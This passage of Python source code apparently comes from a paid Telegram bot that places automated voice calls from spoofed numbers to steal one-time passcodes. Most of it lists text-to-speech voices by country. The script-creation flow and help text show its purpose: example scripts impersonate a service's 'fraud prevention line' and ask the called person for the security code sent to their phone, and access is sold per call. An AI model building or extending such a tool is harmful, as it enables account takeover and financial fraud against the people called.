        item1 = types.InlineKeyboardButton("ru-RU-Standard-E",callback_data="ru-RU-Standard-E")
        item2 = types.InlineKeyboardButton("ru-RU-Standard-A",callback_data="ru-RU-Standard-A")
        item3 = types.InlineKeyboardButton("ru-RU-Standard-B",callback_data="ru-RU-Standard-B")
        item4 = types.InlineKeyboardButton("ru-RU-Standard-C",callback_data="ru-RU-Standard-C")
        item5 = types.InlineKeyboardButton("ru-RU-Standard-D",callback_data="ru-RU-Standard-D")
        item6 = types.InlineKeyboardButton("ru-RU-Wavenet-E",callback_data="ru-RU-Wavenet-E")
        item7 = types.InlineKeyboardButton("ru-RU-Wavenet-A",callback_data="ru-RU-Wavenet-A")
        item8 = types.InlineKeyboardButton("ru-RU-Wavenet-B",callback_data="ru-RU-Wavenet-B")
        item9 = types.InlineKeyboardButton("ru-RU-Wavenet-C",callback_data="ru-RU-Wavenet-C")
        item10 = types.InlineKeyboardButton("ru-RU-Wavenet-D",callback_data="ru-RU-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In RU')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "SK":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("sk-SK-Standard-A",callback_data="sk-SK-Standard-A")
        item2 = types.InlineKeyboardButton("sk-SK-Wavenet-A",callback_data="sk-SK-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In SK')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "RS":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("sr-RS-Standard-A",callback_data="sr-RS-Standard-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In RS')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "SK":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("th-TH-Standard-A",callback_data="th-TH-Standard-A")
        item2 = types.InlineKeyboardButton("th-TH-Neural2-C",callback_data="th-TH-Neural2-C")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In SK')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "UA":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("uk-UA-Standard-A",callback_data="uk-UA-Standard-A")
        item2 = types.InlineKeyboardButton("uk-UA-Wavenet-A",callback_data="uk-UA-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In UA')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "VN":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("vi-VN-Standard-A",callback_data="vi-VN-Standard-A")
        item2 = types.InlineKeyboardButton("vi-VN-Standard-B",callback_data="vi-VN-Standard-B")
        item3 = types.InlineKeyboardButton("vi-VN-Standard-C",callback_data="vi-VN-Standard-C")
        item4 = types.InlineKeyboardButton("vi-VN-Standard-D",callback_data="vi-VN-Standard-D")
        item5 = types.InlineKeyboardButton("vi-VN-Wavenet-A",callback_data="vi-VN-Wavenet-A")
        item6 = types.InlineKeyboardButton("vi-VN-Wavenet-B",callback_data="vi-VN-Wavenet-B")
        item7 = types.InlineKeyboardButton("vi-VN-Wavenet-C",callback_data="vi-VN-Wavenet-C")
        item8 = types.InlineKeyboardButton("vi-VN-Wavenet-D",callback_data="vi-VN-Wavenet-D")
        item9 = types.InlineKeyboardButton("vi-VN-Neural2-A",callback_data="vi-VN-Neural2-A")
        item10 = types.InlineKeyboardButton("vi-VN-Neural2-D",callback_data="vi-VN-Neural2-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In VN')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)  
    elif call.data == "PL":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("pl-PL-Standard-A",callback_data="pl-PL-Standard-A")
        item2 = types.InlineKeyboardButton("pl-PL-Standard-B",callback_data="pl-PL-Standard-B")
        item3 = types.InlineKeyboardButton("pl-PL-Standard-C",callback_data="pl-PL-Standard-C")
        item4 = types.InlineKeyboardButton("pl-PL-Standard-E",callback_data="pl-PL-Standard-E")
        item5 = types.InlineKeyboardButton("pl-PL-Standard-D",callback_data="pl-PL-Standard-D")
        item6 = types.InlineKeyboardButton("pl-PL-Wavenet-A",callback_data="pl-PL-Wavenet-A")
        item7 = types.InlineKeyboardButton("pl-PL-Wavenet-B",callback_data="pl-PL-Wavenet-B")
        item8 = types.InlineKeyboardButton("pl-PL-Wavenet-C",callback_data="pl-PL-Wavenet-C")
        item9 = types.InlineKeyboardButton("pl-PL-Wavenet-E",callback_data="pl-PL-Wavenet-E")
        item10 = types.InlineKeyboardButton("pl-PL-Wavenet-D",callback_data="pl-PL-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In PL')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "TR":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("tr-TR-Standard-B",callback_data="tr-TR-Standard-B")
        item2 = types.InlineKeyboardButton("tr-TR-Standard-C",callback_data="tr-TR-Standard-C")
        item3 = types.InlineKeyboardButton("tr-TR-Standard-D",callback_data="tr-TR-Standard-D")
        item4 = types.InlineKeyboardButton("tr-TR-Standard-A",callback_data="tr-TR-Standard-A")
        item5 = types.InlineKeyboardButton("tr-TR-Standard-E",callback_data="tr-TR-Standard-E")
        item6 = types.InlineKeyboardButton("tr-TR-Wavenet-B",callback_data="tr-TR-Wavenet-B")
        item7 = types.InlineKeyboardButton("tr-TR-Wavenet-C",callback_data="tr-TR-Wavenet-C")
        item8 = types.InlineKeyboardButton("tr-TR-Wavenet-D",callback_data="tr-TR-Wavenet-D")
        item9 = types.InlineKeyboardButton("tr-TR-Wavenet-E",callback_data="tr-TR-Wavenet-E")
        item10 = types.InlineKeyboardButton("tr-TR-Wavenet-A",callback_data="tr-TR-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In TR')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "ID":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("id-ID-Standard-A",callback_data="id-ID-Standard-A")
        item2 = types.InlineKeyboardButton("id-ID-Standard-B",callback_data="id-ID-Standard-B")
        item3 = types.InlineKeyboardButton("id-ID-Standard-C",callback_data="id-ID-Standard-C")
        item4 = types.InlineKeyboardButton("id-ID-Standard-D",callback_data="id-ID-Standard-D")
        item5 = types.InlineKeyboardButton("id-ID-Wavenet-D",callback_data="id-ID-Wavenet-D")
        item6 = types.InlineKeyboardButton("id-ID-Wavenet-A",callback_data="id-ID-Wavenet-A")
        item7 = types.InlineKeyboardButton("id-ID-Wavenet-B",callback_data="id-ID-Wavenet-B")
        item8 = types.InlineKeyboardButton("id-ID-Wavenet-C",callback_data="id-ID-Wavenet-C")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In ID')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "PH":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("fil-PH-Standard-A",callback_data="fil-PH-Standard-A")
        item2 = types.InlineKeyboardButton("fil-PH-Standard-B",callback_data="fil-PH-Standard-B")
        item3 = types.InlineKeyboardButton("fil-PH-Standard-C",callback_data="fil-PH-Standard-C")
        item4 = types.InlineKeyboardButton("fil-PH-Standard-D",callback_data="fil-PH-Standard-D")
        item5 = types.InlineKeyboardButton("fil-PH-Wavenet-A",callback_data="fil-PH-Wavenet-A")
        item6 = types.InlineKeyboardButton("fil-PH-Wavenet-B",callback_data="fil-PH-Wavenet-B")
        item7 = types.InlineKeyboardButton("fil-PH-Wavenet-C",callback_data="fil-PH-Wavenet-C")
        item8 = types.InlineKeyboardButton("fil-PH-Wavenet-D",callback_data="fil-PH-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In PH')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)  
    elif call.data == "IT":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("it-IT-Standard-B",callback_data="it-IT-Standard-B")
        item2 = types.InlineKeyboardButton("it-IT-Standard-C",callback_data="it-IT-Standard-C")
        item3 = types.InlineKeyboardButton("it-IT-Standard-D",callback_data="it-IT-Standard-D")
        item4 = types.InlineKeyboardButton("it-IT-Standard-A",callback_data="it-IT-Standard-A")
        item5 = types.InlineKeyboardButton("it-IT-Wavenet-A",callback_data="it-IT-Wavenet-A")
        item6 = types.InlineKeyboardButton("it-IT-Wavenet-B",callback_data="it-IT-Wavenet-B")
        item7 = types.InlineKeyboardButton("it-IT-Wavenet-C",callback_data="it-IT-Wavenet-C")
        item8 = types.InlineKeyboardButton("it-IT-Wavenet-D",callback_data="it-IT-Wavenet-D")
        item9 = types.InlineKeyboardButton("it-IT-Neural2-A",callback_data="it-IT-Neural2-A")
        item10 = types.InlineKeyboardButton("it-IT-Neural2-C",callback_data="it-IT-Neural2-C")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In IT')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "GR":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("el-GR-Standard-A",callback_data="el-GR-Standard-A")
        item2 = types.InlineKeyboardButton("el-GR-Wavenet-A",callback_data="el-GR-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In GR')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "KR":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("ko-KR-Standard-A",callback_data="ko-KR-Standard-A")
        item2 = types.InlineKeyboardButton("ko-KR-Standard-B",callback_data="ko-KR-Standard-B")
        item3 = types.InlineKeyboardButton("ko-KR-Standard-C",callback_data="ko-KR-Standard-C")
        item4 = types.InlineKeyboardButton("ko-KR-Standard-D",callback_data="ko-KR-Standard-D")
        item5 = types.InlineKeyboardButton("ko-KR-Wavenet-A",callback_data="ko-KR-Wavenet-A")
        item6 = types.InlineKeyboardButton("ko-KR-Wavenet-B",callback_data="ko-KR-Wavenet-B")
        item7 = types.InlineKeyboardButton("ko-KR-Wavenet-C",callback_data="ko-KR-Wavenet-C")
        item8 = types.InlineKeyboardButton("ko-KR-Wavenet-D",callback_data="ko-KR-Wavenet-D")
        item9 = types.InlineKeyboardButton("ko-KR-Neural2-A",callback_data="ko-KR-Neural2-A")
        item10 = types.InlineKeyboardButton("ko-KR-Neural2-B",callback_data="ko-KR-Neural2-B")
        item11 = types.InlineKeyboardButton("ko-KR-Neural2-C",callback_data="ko-KR-Neural2-C")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In KR')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "ph":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("fil-ph-Neural2-D",callback_data="fil-ph-Neural2-D")
        item2 = types.InlineKeyboardButton("fil-ph-Neural2-A",callback_data="fil-ph-Neural2-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In KR')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "ES":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("eu-ES-Standard-A",callback_data="eu-ES-Standard-A")
        item2 = types.InlineKeyboardButton("gl-ES-Standard-A",callback_data="gl-ES-Standard-A")
        item3 = types.InlineKeyboardButton("es-ES-Standard-A",callback_data="es-ES-Standard-A")
        item4 = types.InlineKeyboardButton("es-ES-Standard-C",callback_data="es-ES-Standard-C")
        item5 = types.InlineKeyboardButton("es-ES-Standard-D",callback_data="es-ES-Standard-D")
        item6 = types.InlineKeyboardButton("es-ES-Standard-B",callback_data="es-ES-Standard-B")
        item7 = types.InlineKeyboardButton("ca-ES-Standard-A",callback_data="ca-ES-Standard-A")
        item8 = types.InlineKeyboardButton("es-ES-Wavenet-C",callback_data="es-ES-Wavenet-C")
        item9 = types.InlineKeyboardButton("es-ES-Wavenet-D",callback_data="es-ES-Wavenet-D")
        item10 = types.InlineKeyboardButton("es-ES-Wavenet-B",callback_data="es-ES-Wavenet-B")
        item11 = types.InlineKeyboardButton("es-ES-Neural2-A",callback_data="es-ES-Neural2-A")
        item12 = types.InlineKeyboardButton("es-ES-Neural2-B",callback_data="es-ES-Neural2-B")
        item13 = types.InlineKeyboardButton("es-ES-Neural2-C",callback_data="es-ES-Neural2-C")
        item14 = types.InlineKeyboardButton("es-ES-Neural2-D",callback_data="es-ES-Neural2-D")
        item15 = types.InlineKeyboardButton("es-ES-Neural2-E",callback_data="es-ES-Neural2-E")
        item16 = types.InlineKeyboardButton("es-ES-Neural2-F",callback_data="es-ES-Neural2-F")
        item17 = types.InlineKeyboardButton("es-ES-Polyglot-1",callback_data="es-ES-Polyglot-1")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,item17,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇪🇸 Available Voice/Languages In Spain 🇪🇸')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)

    elif call.data == 'IN':
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = telebot.types.InlineKeyboardButton(text='mr-IN-Standard-A', callback_data='mr-IN-Standard-A')
        item2 = telebot.types.InlineKeyboardButton(text='mr-IN-Standard-B', callback_data='mr-IN-Standard-B')
        item3 = telebot.types.InlineKeyboardButton(text='mr-IN-Standard-C', callback_data='mr-IN-Standard-C')
        item4 = telebot.types.InlineKeyboardButton(text='pa-IN-Standard-A', callback_data='pa-IN-Standard-A')
        item5 = telebot.types.InlineKeyboardButton(text='pa-IN-Standard-B', callback_data='pa-IN-Standard-B')
        item6 = telebot.types.InlineKeyboardButton(text='pa-IN-Standard-C', callback_data='pa-IN-Standard-C')
        item7 = telebot.types.InlineKeyboardButton(text='pa-IN-Standard-D', callback_data='pa-IN-Standard-D')
        item8 = telebot.types.InlineKeyboardButton(text='ta-IN-Standard-C', callback_data='ta-IN-Standard-C')
        item9 = telebot.types.InlineKeyboardButton(text='ta-IN-Standard-D', callback_data='ta-IN-Standard-D')
        item10 = telebot.types.InlineKeyboardButton(text='bn-IN-Standard-A', callback_data='bn-IN-Standard-A')
        item11 = telebot.types.InlineKeyboardButton(text='bn-IN-Standard-B', callback_data='bn-IN-Standard-B')
        item12 = telebot.types.InlineKeyboardButton(text='gu-IN-Standard-A', callback_data='gu-IN-Standard-A')
        item13 = telebot.types.InlineKeyboardButton(text='gu-IN-Standard-B', callback_data='gu-IN-Standard-B')
        item14 = telebot.types.InlineKeyboardButton(text='kn-IN-Standard-A', callback_data='kn-IN-Standard-A')
        item15 = telebot.types.InlineKeyboardButton(text='kn-IN-Standard-B', callback_data='kn-IN-Standard-B')
        item16 = telebot.types.InlineKeyboardButton(text='ml-IN-Standard-A', callback_data='ml-IN-Standard-A')
        item17 = telebot.types.InlineKeyboardButton(text='ml-IN-Standard-B', callback_data='ml-IN-Standard-B')
        item18 = telebot.types.InlineKeyboardButton(text='ta-IN-Standard-A', callback_data='ta-IN-Standard-A')
        item19 = telebot.types.InlineKeyboardButton(text='ta-IN-Standard-B', callback_data='ta-IN-Standard-B')
        item20 = telebot.types.InlineKeyboardButton(text='en-IN-Standard-D', callback_data='en-IN-Standard-D')
        item21 = telebot.types.InlineKeyboardButton(text='en-IN-Standard-A', callback_data='en-IN-Standard-A')
        item22 = telebot.types.InlineKeyboardButton(text='en-IN-Standard-B', callback_data='en-IN-Standard-B')
        item23 = telebot.types.InlineKeyboardButton(text='en-IN-Standard-C', callback_data='en-IN-Standard-C')
        item24 = telebot.types.InlineKeyboardButton(text='hi-IN-Standard-D', callback_data='hi-IN-Standard-D')
        item25 = telebot.types.InlineKeyboardButton(text='hi-IN-Standard-A', callback_data='hi-IN-Standard-A')
        item26 = telebot.types.InlineKeyboardButton(text='hi-IN-Standard-B', callback_data='hi-IN-Standard-B')
        item27 = telebot.types.InlineKeyboardButton(text='hi-IN-Standard-C', callback_data='hi-IN-Standard-C')
        item28 = telebot.types.InlineKeyboardButton(text='te-IN-Standard-A', callback_data='te-IN-Standard-A')
        item29 = telebot.types.InlineKeyboardButton(text='te-IN-Standard-B', callback_data='te-IN-Standard-B')
        item30 = telebot.types.InlineKeyboardButton(text='bn-IN-Wavenet-A', callback_data='bn-IN-Wavenet-A')
        item31 = telebot.types.InlineKeyboardButton(text='bn-IN-Wavenet-B', callback_data='bn-IN-Wavenet-B')
        item32 = telebot.types.InlineKeyboardButton(text='en-IN-Wavenet-D', callback_data='en-IN-Wavenet-D')
        item33 = telebot.types.InlineKeyboardButton(text='en-IN-Wavenet-A', callback_data='en-IN-Wavenet-A')
        item34 = telebot.types.InlineKeyboardButton(text='en-IN-Wavenet-B', callback_data='en-IN-Wavenet-B')
        item35 = telebot.types.InlineKeyboardButton(text='en-IN-Wavenet-C', callback_data='en-IN-Wavenet-C')
        item36 = telebot.types.InlineKeyboardButton(text='gu-IN-Wavenet-A', callback_data='gu-IN-Wavenet-A')
        item37 = telebot.types.InlineKeyboardButton(text='gu-IN-Wavenet-B', callback_data='gu-IN-Wavenet-B')
        item38 = telebot.types.InlineKeyboardButton(text='hi-IN-Wavenet-D', callback_data='hi-IN-Wavenet-D')
        item39 = telebot.types.InlineKeyboardButton(text='hi-IN-Wavenet-A', callback_data='hi-IN-Wavenet-A')
        item40 = telebot.types.InlineKeyboardButton(text='hi-IN-Wavenet-B', callback_data='hi-IN-Wavenet-B')
        item41 = telebot.types.InlineKeyboardButton(text='hi-IN-Wavenet-C', callback_data='hi-IN-Wavenet-C')
        item42 = telebot.types.InlineKeyboardButton(text='kn-IN-Wavenet-A', callback_data='kn-IN-Wavenet-A')
        item43 = telebot.types.InlineKeyboardButton(text='kn-IN-Wavenet-B', callback_data='kn-IN-Wavenet-B')
        item44 = telebot.types.InlineKeyboardButton(text='ml-IN-Wavenet-A', callback_data='ml-IN-Wavenet-A')
        item45 = telebot.types.InlineKeyboardButton(text='ml-IN-Wavenet-B', callback_data='ml-IN-Wavenet-B')
        item46 = telebot.types.InlineKeyboardButton(text='ml-IN-Wavenet-C', callback_data='ml-IN-Wavenet-C')
        item47 = telebot.types.InlineKeyboardButton(text='ml-IN-Wavenet-D', callback_data='ml-IN-Wavenet-D')
        item48 = telebot.types.InlineKeyboardButton(text='mr-IN-Wavenet-A', callback_data='mr-IN-Wavenet-A')
        item49 = telebot.types.InlineKeyboardButton(text='mr-IN-Wavenet-B', callback_data='mr-IN-Wavenet-B')
        item50 = telebot.types.InlineKeyboardButton(text='mr-IN-Wavenet-C', callback_data='mr-IN-Wavenet-C')
        item51 = telebot.types.InlineKeyboardButton(text='pa-IN-Wavenet-A', callback_data='pa-IN-Wavenet-A')
        item52 = telebot.types.InlineKeyboardButton(text='pa-IN-Wavenet-B', callback_data='pa-IN-Wavenet-B')
        item53 = telebot.types.InlineKeyboardButton(text='pa-IN-Wavenet-C', callback_data='pa-IN-Wavenet-C')
        item54 = telebot.types.InlineKeyboardButton(text='pa-IN-Wavenet-D', callback_data='pa-IN-Wavenet-D')
        item55 = telebot.types.InlineKeyboardButton(text='ta-IN-Wavenet-A', callback_data='ta-IN-Wavenet-A')
        item56 = telebot.types.InlineKeyboardButton(text='ta-IN-Wavenet-B', callback_data='ta-IN-Wavenet-B')
        item57 = telebot.types.InlineKeyboardButton(text='ta-IN-Wavenet-C', callback_data='ta-IN-Wavenet-C')
        item58 = telebot.types.InlineKeyboardButton(text='ta-IN-Wavenet-D', callback_data='ta-IN-Wavenet-D')
        item59 = telebot.types.InlineKeyboardButton(text='hi-IN-Neural2-A', callback_data='hi-IN-Neural2-A')
        item60 = telebot.types.InlineKeyboardButton(text='hi-IN-Neural2-B', callback_data='hi-IN-Neural2-B')
        item61 = telebot.types.InlineKeyboardButton(text='hi-IN-Neural2-C', callback_data='hi-IN-Neural2-C')
        item62 = telebot.types.InlineKeyboardButton(text='hi-IN-Neural2-D', callback_data='hi-IN-Neural2-D')
        item63 = telebot.types.InlineKeyboardButton(text='Back', callback_data='back')

        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,item17,item18,item19,item20,item21,item22,item23,item24,item25,item26,item27,item28,item29,item30,item31,item32,item33,item34,item35,item36,item37,item38,item39,item40,item41,item42,item43,item44,item45,item46,item47,item48,item49,item50,item51,item52,item53,item54,item55,item56,item57,item58,item59,item60,item61,item62,item63)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇮🇳 Available Voice/Languages In India 🇮🇳')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)

    elif call.data in google_voice_name:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'`{call.data}`', parse_mode='markdown')
        audio_file = open(f'./Audio/{call.data}.wav', 'rb')
        bot.send_audio(chat_id=call.message.chat.id, audio=audio_file)
    


@bot.message_handler(commands=['start'])
def send_welcome(message):
    id = message.from_user.id
    print(id)
    print(check_user(id))
    print(check_admin(id))
    print(fetch_expiry_date(id))
    if check_admin(id) == True or id == 2047475714:
        if check_user(id) != True:
            create_user_lifetime(id)
        else:
            pass
        keyboard = types.InlineKeyboardMarkup()
        name = message.from_user.first_name
        admin1 = types.InlineKeyboardButton('[🔐] Admin [🔐]', callback_data='Admin mode')
        user1 = types.InlineKeyboardButton('[👤] User [👤]', callback_data='User Mode')
        stat = types.InlineKeyboardButton('[+] Stats [+]', callback_data='botstats')
        keyboard.add(admin1,user1)
        keyboard.add(stat)
        send = bot.send_message(message.chat.id, f" *Hey [👑] Owner {name} [👑]  \n\n[+]Some Comands [+]*\n\n`/addcall` [no_of_call](https://t.me/c/1749427308/4189)\n`/getdata` [Example](https://t.me/c/1749427308/4192)\n`/adduser` [USERID] [No_Of_Calls] (Use This Command Only In Bot)\n`/getinfo` [UserID]\n\n*In Which Mode Do You Want To Access? *",reply_markup=keyboard,parse_mode='Markdown')

    elif check_expiry_days(id):
        days_left = fetch_option2(id)
        name = message.from_user.first_name
        name2 = message.from_user.last_name
        username = message.chat.username
        keyboardd = types.InlineKeyboardMarkup()
        item4 = types.InlineKeyboardButton('[+] Commands [+]', callback_data='botcommands')
        keyboardd.add(item4)
        send = bot.send_message(message.chat.id, f"*[⚜️] USER INFO [⚜️]\n\n[👤] Name »» {name} \n[🔗]Username »» @{username} \n[🔒]User Id »» {message.chat.id}\n \n[⏰] Remaining Calls: {days_left} Calls*",reply_markup=keyboardd,parse_mode='Markdown')
        
    else:
        pass
        keyboardd = types.InlineKeyboardMarkup()
        name = message.from_user.first_name
        user_id = message.from_user.id 
        user_name = message.from_user.first_name 
        item1 = types.InlineKeyboardButton('[💰] Buy Access [💰]', url='t.me/redlinegod_1')
        keyboardd.add(item1)
        send = bot.send_message(message.chat.id, f"*{name}  You Don't Have Access To Use This Bot \n\nBuy Key & Reedem It To Use The Bot*",reply_markup=keyboardd,parse_mode='Markdown')


@bot.message_handler(commands=['addcalls'])
def custo_script(message):
    if message.chat.id == 2047475714:
        send = bot.send_message(message.chat.id, "Please enter Userid:Calls : ")
        bot.register_next_step_handler(send, saving_first)

def saving_first(message):
    msg = message.text
    userid = msg.split(':')[0]
    calls = msg.split(':')[1]
    create_user_test(userid,calls)
    send = bot.send_message(message.chat.id, "Calls Added")


@bot.message_handler(commands=['createscript'])
def custom_script(message):
    if check_expiry_days(message.chat.id):
        send = bot.send_message(message.chat.id, "*✏️ Please enter the first part of your script now.\n\n📜 Example: Hello {name}, this is the {service} fraud prevention line. We have sent this automated message because of an attempt to change the password on your {service} account. If this was not you, please press 1.*",parse_mode='markdown')
        bot.register_next_step_handler(send, savings_first)
    else:
        keyboardd = types.InlineKeyboardMarkup()
        name = message.from_user.first_name

        item1 = types.InlineKeyboardButton('[💰] Buy Access [💰]', url='t.me/redlinegod_1')
        item2 = types.InlineKeyboardButton('[+] Channel [+]', url='t.me/riderotp')
        item3 = types.InlineKeyboardButton('[+] Vouches [+]', url='t.me/riderotpvouch')
        item4 = types.InlineKeyboardButton('[+] Price [+]', url='t.me/riderotp/10')
        keyboardd.add(item1)
        keyboardd.add(item2 , item3)
        keyboardd.add(item4)
        send = bot.send_message(message.chat.id,
                               f"*❌Hey,  {name}  Mate You Are Not Authorized To Use This Bot🤖*",reply_markup=keyboardd,parse_mode='Markdown')

def savings_first(message):
    global first_part
    script_tobesaved = message.text
    userid = message.from_user.id
    first_part = script_tobesaved
    send = bot.send_message(message.chat.id, "*✏️ Please enter the second part of your script now.\n\n📜 Example: To block this request, please enter the {otpdigits} digit security code that we have sent to your mobile device.*",parse_mode='markdown')
    bot.register_next_step_handler(send, savings_second)

def savings_second(message):
    global second_part
    script_tobesaved = message.text
    userid = message.from_user.id
    second_part = script_tobesaved
    send = bot.send_message(message.chat.id, "*✏️ Please enter the code accepted part of your script.\n\n📜 Example: The {otpdigits} digit security code that you entered is valid, your request has been blocked.*",parse_mode='markdown')
    bot.register_next_step_handler(send, savings_third)


def savings_third(message):
    global third_part
    script_tobesaved = message.text
    userid = message.from_user.id
    third_part = script_tobesaved
    send = bot.send_message(message.chat.id, "*✏️ Please enter the code denied part of your script.\n\n📜 Example: The {otpdigits} digit security code that you entered is invalid, please try again.*",parse_mode='markdown')

    bot.register_next_step_handler(send, savings_fouth)


def savings_fouth(message):
    global fourth_part,first_part,second_part,third_part
    script_tobesaved = message.text
    userid = message.from_user.id
    fourth_part = script_tobesaved
    print(first_part)
    print(second_part)
    print(third_part)
    print(fourth_part)
    script_id = create_bin(first_part,second_part,third_part,fourth_part,api_key)
    send = bot.send_message(message.chat.id,f"*Script Id : *`{script_id}` ",parse_mode='markdown')


def botcommands(message):
    print(message.message_id)
    #bot.edit_message(message.chat.id , message.message_id)
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id,text=" *[🤳] Call Help Commands [🤳]\n\n/call - Use To Call Anyone Using Sppof Number \n/createscript - Create A Script To Use It In Call\n/voice -  Use To Get Voice Name & Language \n/help - Use For Help & To Understand How To Make Call\n/status - Check Bot Status*" , parse_mode="Markdown")



@bot.message_handler(commands=['help'])
def helpcommand(message):
    id = message.chat.id
